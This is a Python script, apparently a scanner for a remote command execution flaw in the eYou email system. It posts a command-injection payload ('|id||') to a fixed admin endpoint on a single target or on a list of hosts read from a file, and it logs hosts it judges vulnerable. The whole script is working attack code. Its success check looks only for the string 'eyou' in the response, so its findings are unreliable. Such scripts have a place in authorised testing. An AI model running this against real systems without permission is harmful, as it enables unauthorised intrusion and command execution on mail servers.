#!/usr/bin/python3
#-*- coding:utf-8 -*-

import argparse
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

key=0
def header():
	print('\033[34m*-----------------------------------------*\033[0m')
	print('\033[34m!description:亿邮电子邮件系统远程命令执行漏洞检测     \033[0m')
	print('\033[34m*-----------------------------------------*\033[0m')

def Arg_Parse():
	parser = argparse.ArgumentParser()
	parser.add_argument("-u","--url",metavar='',help="目标url地址")
	parser.add_argument("-f","--file",metavar='',help="目标地址文件")
	args = parser.parse_args()
	return args

def Write_Results(url):
	with open('results.txt','a+') as wp:
		wp.write(url+'\n')

def Detect(url):
	vuln_url = url + "/webadm/?q=moni_detail.do&action=gragh"
	headers = {"Content-Type": "application/x-www-form-urlencoded"}
	data = "type='|id||'"
	try:
		requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
		response = requests.post(url=vuln_url,headers=headers,data=data,verify=False,timeout=5)
		print("\033[32m正在检测:{}\033[0m".format(vuln_url))
		if response.status_code == 200 and "eyou" in response.text:
			print("\033[31m{}存在漏洞！！！\033[0m".format(vuln_url))
			if key:
				Write_Results(vuln_url)
			else:
				pass
		else:
			print("\033[32m未检测到该漏洞存在！！！ \033[0m")
	except Exception as e:
		print("\033[32m{}访问失败！！！ \033[0m".format(url))

if __name__ == '__main__':
	args = Arg_Parse()
	if args.url:
		Detect(args.url)	
	elif args.file:
		key=1
		with open(args.file,'r') as fp:
			for line in fp.readlines():
				Detect(line.strip())
	else:
		print("\033[33m输入的参数有误，请使用-h参数查看脚本用法 \033[0m")
				